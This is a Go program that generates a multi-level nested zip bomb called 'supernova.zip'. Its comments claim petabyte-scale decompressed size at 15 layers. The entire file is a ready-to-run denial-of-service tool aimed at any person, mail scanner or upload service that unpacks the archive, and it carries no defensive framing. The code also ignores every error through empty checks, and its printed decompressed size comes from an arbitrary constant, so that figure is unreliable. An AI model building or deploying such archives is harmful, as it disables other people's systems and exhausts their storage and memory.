	package main

	// ./<bin> <amount of layers>

	// supernova with 5500 Petabyte
	// ./<bin> 15

	import (
		"archive/zip"
		"io"
		"fmt"
		"os"
		"strconv"
		"io/ioutil"
		"strings"
		"time"
	)


	const outfile = "supernova.zip"

	func ZipFiles(filename string, file string) error {
		newZipFile, err := os.Create(filename)
		if err != nil {}
		defer newZipFile.Close()

		zipWriter := zip.NewWriter(newZipFile)
		defer zipWriter.Close()

		err = AddFileToZip(zipWriter, file)
		os.Remove(file)
		return err
	}

	func AddFileToZip(zipWriter *zip.Writer, filename string) error {
		fileToZip, err := os.Open(filename)
		if err != nil {}
		defer fileToZip.Close()

		info, err := fileToZip.Stat()
		if err != nil {}

		header, err := zip.FileInfoHeader(info)
		if err != nil {}

		header.Name = filename

		header.Method = zip.Deflate
		writer, err := zipWriter.CreateHeader(header)
		if err != nil {}
		_, err = io.Copy(writer, fileToZip)
		return err
	}

	func CopyAndCompress(file string, count int) error {
		// Create next level zip archive
		newZipName := fmt.Sprintf("level%d.zip", count+1)
		newZipFile, err := os.Create(newZipName)
		if err != nil {}
		defer newZipFile.Close()
		zipWriter := zip.NewWriter(newZipFile)
		defer zipWriter.Close()

		// Add ten copies of the previous level zip archive
		bytesRead, err := ioutil.ReadFile(file)
		if err != nil {}
		for i := 1; i <= 10; i++ {
			zipName := fmt.Sprintf("%d.zip", i)
			err = ioutil.WriteFile(zipName, bytesRead, 0755)
			if err != nil {}
			err = AddFileToZip(zipWriter, zipName)
			if err != nil {}
			os.Remove(zipName)
		}
		os.Remove(file)
		return nil
	}



	func GenerateNest(levels int) {
		start := time.Now()

		// Create a dummy file of size 1MB
		dummyFile := "dummy.txt"
		file, err := os.Create(dummyFile)
		if err != nil {}

		x := strings.Repeat("0", 1024*1024)
		_, err = file.Write([]byte(x))
		if err != nil {}
		file.Close()

		// Make level1 zip archive using the dummy file
		level1 := "level1.zip"
		err = ZipFiles(level1, dummyFile)
		if err != nil {}

		decompressionSize := 24214 * 10 // Initialize based on the size of 10 zip files
		for i := 1; i < levels; i++ {
			decompressionSize *= 10 // Adjust for the number of files at each level
			zipName := fmt.Sprintf("level%d.zip", i)
			err = CopyAndCompress(zipName, i)
			if err != nil {}
		}
		decompressionSize = decompressionSize / (1024 * 1024) // Convert to MB

		// Rename the last level zip archive
		bombLevel := fmt.Sprintf("level%d.zip", levels)
		bytesRead, err := ioutil.ReadFile(bombLevel)
		if err != nil {}
		err = ioutil.WriteFile(outfile, bytesRead, 0755)
		if err != nil {}
		os.Remove(bombLevel)
		os.Remove(dummyFile)

		end := time.Now()
		elapsed := end.Sub(start)

		bombInfo, err := os.Stat(outfile)
		if err != nil {}
		bombSize := bombInfo.Size()
		fmt.Println("disk filesize of supernova.zip:", bombSize/1024, "KB")
		fmt.Println("decompressed filesize:", decompressionSize, "MB")
		fmt.Println("time elapsed:", elapsed, "ms")
	}

	func main() {
		levels, err := strconv.Atoi(os.Args[1])
		if err != nil {}
		GenerateNest(levels)
	}
